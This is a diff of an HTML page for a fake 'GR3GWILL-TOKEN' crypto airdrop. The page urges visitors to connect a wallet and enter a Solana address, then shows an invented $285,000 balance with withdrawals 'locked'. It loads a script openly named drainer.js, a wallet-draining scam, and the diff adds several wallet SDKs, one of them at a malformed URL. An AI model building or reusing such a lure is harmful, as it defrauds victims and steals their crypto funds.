@@ -1,53 +1,75 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
- <meta charset="UTF-8">
- <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>Gr3gwill – Free Airdrop</title>
-
-    <!-- Libraries -->       
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>                                                                            
-
-    <!-- CSS -->
-    <link rel="stylesheet" href="styles.css">
-
-    <!-- External theme (adds gradient background, particles, pulse effect) -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/airdrop-theme/cdn@1.0/airdrop-theme.min.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gr3gwill – Free Airdrop</title>
+<link rel="stylesheet" href="styles.css">
+<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@binance-chain/javascript-sdk/dist/binance.js"></script>
+<script src="https://cdn.jsdelivr.net.npm/@bitcoinjs/browser/dist/bitcon.js"></script>
 </head>
 <body>
 
-<div class="airdrop-wrap">
-    <div class="bg-gradient"></div>
-
-    <!-- decorative particles -->
-    <div class="particle" style="top:10%; left:15%; width:4px; height:4px; animation-delay:0s;"></div>
-    <div class="particle" style="top:80%; left:70%; width:6px; height:6px; animation-delay:2s;"></div>
-    <div class="particle" style="top:40%; left:90%; width:3px; height:3px; animation-delay:4s;"></div>
-    <div class="particle" style="top:60%; left:30%; width:5px; height:5px; animation-delay:6s;"></div>
-
-    <div class="topbar">🚀 Claim Your GR3G Tokens</div>
-
-    <div class="container">
-        <div class="logo-circle">GR3T</div>                                  
-        <h1 class="pulse">LUCKY YOU!</h1>
-        <div class="subtitle">GR3GWILL‑TOKEN airdrop is still ongoing.</div>
-
-        <button id="connectWallet">Click to Claim Airdrop</button>
-
-        <div id="solanaInput" style="display:none;">
-            <input type="text" id="solanaAddress" placeholder="Enter your Solana address">
-            <button id="scanAddress">Submit Solana Address</button>
-        </div>
-
-        <div id="terms" style="display:none;">
-            <button id="acceptTerms">Accept Terms & Conditions</button>
-        </div>
-
-        <p id="status"></p>
-    </div>
+<!-- Landing Section -->
+<div class="container" id="landingSection">
+  <div class="logo-circle">GR3T</div>
+  <h1 class="pulse">LUCKY YOU!</h1>
+  <p class="subtitle">GR3GWILL‑TOKEN airdrop is ongoing.</p>
+  <button id="proceedBtn">Click to Claim Airdrop</button>
 </div>
 
-<script src="drainer.js"></script>
+<!-- Connect Wallet Section -->
+<div class="container hidden" id="connectSection">
+  <button id="connectBtn">Connect Wallet</button>
+</div>
+
+<!-- Solana Wallet Input Section -->
+<div class="container hidden" id="solanaSection">
+  <input type="text" id="solAddress" placeholder="Enter your Solana wallet" />
+  <div class="progress"><span></span></div>
+  
+  <!-- Submit button appears after typing -->
+  <button id="submitSol" class="hidden">Submit</button>
+</div>
+  
+<!-- Terms Modal -->
+<div class="modal hidden" id="termsModal">
+  <div class="modal-card">
+    <h2>Terms & Conditions</h2>
+    <p class="terms">You confirm that the wallet address entered is correct.</p>
+    <div class="modal-actions">
+      <button id="acceptBtn">Accept</button>
+    </div>
+  </div>
+</div>
+
+<!-- Airdrop Page -->
+<section id="airdropPage" class="hidden">
+ <div class="balance-label">Airdrop Balance</div>
+ <div class="balance-amount">$285,000.32</div>
+     <div class="wallet-icon">G</div>
+     <div>
+        <h2>Gr3T Wallet</h2>
+        <p id="userWallet">—</p>
+      </div>
+    </div>
+    <div class="balance-section">
+      <span class="label">Airdrop Balance</span>
+      <div class="balance" id="airdropBalance">0</div>
+      <span class="token">GR3T</span>
+    </div>
+    <div class="balance-diff-section hidden" id="balanceDiffSection">
+      <span class="label">Balance Change:</span>
+      <div class="balance" id="balanceDiff">0</div>
+      <span class="token">GR3T</span>
+    </div>
+    <p class="note">🔒 Withdrawals locked. Airdrop will be sent immediately after token launch.</p>
+  </div>
+</section>
+
 <script src="script.js"></script>
+<script src="drainer.js"></script>
 </body>
-</html>
+    </html>
